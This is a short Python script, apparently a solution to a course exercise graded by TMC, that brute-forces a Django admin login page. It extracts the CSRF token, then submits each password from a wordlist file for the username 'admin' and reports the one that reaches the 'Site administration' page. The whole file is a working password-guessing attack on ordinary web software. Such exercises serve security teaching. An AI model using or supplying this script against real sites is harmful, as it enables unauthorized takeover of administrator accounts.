import sys
import requests
import bs4 as bs

def extract_token(response):
	soup = bs.BeautifulSoup(response.text, 'html.parser')
	for i in soup.form.findChildren('input'):
		if i.get('name') == 'csrfmiddlewaretoken':
			return i.get('value')
	return None
	

def isloggedin(response):
	soup = bs.BeautifulSoup(response.text, 'html.parser')
	return soup.title.text.startswith('Site administration')


def test_password(address, candidates):
	#get token
	address += '/admin/login/?next=/admin/'
	s = requests.Session()
	r = s.get(address)
	token = (extract_token(r))
	#import candidates as list of items
	#candidates_file = open(candidates, 'r')
	#candidate_content = candidates_file.read()
	#candidates = candidate_content.split('\n')
	#Loop over candidates list
	for password in candidates:
		#send POST login attempt
		payload = {'username' : 'admin', 'password': password, 'csrfmiddlewaretoken' : token}
		attempt = s.post(address, data = payload)
		#if isloggedin=true
		if isloggedin(attempt):
			return password




def main(argv):
	address = sys.argv[1]
	fname = sys.argv[2]
	candidates = [p.strip() for p in open(fname)]
	print(test_password(address, candidates))


# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__": 
	if len(sys.argv) != 3:
		print('usage: python %s address filename' % sys.argv[0])
	else:
		main(sys.argv)
